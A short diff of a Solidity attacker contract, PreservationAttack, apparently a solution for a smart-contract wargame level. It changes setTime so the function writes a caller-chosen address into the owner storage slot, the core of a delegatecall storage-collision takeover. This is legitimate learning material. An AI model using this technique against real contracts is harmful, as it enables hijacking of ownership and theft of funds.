@@ -11,7 +11,6 @@ contract PreservationAttack {
   }
 
   function setTime(uint _time) public {
-    _time;
-    owner = msg.sender;
+    owner = address(uint160(_time));
   }
 }
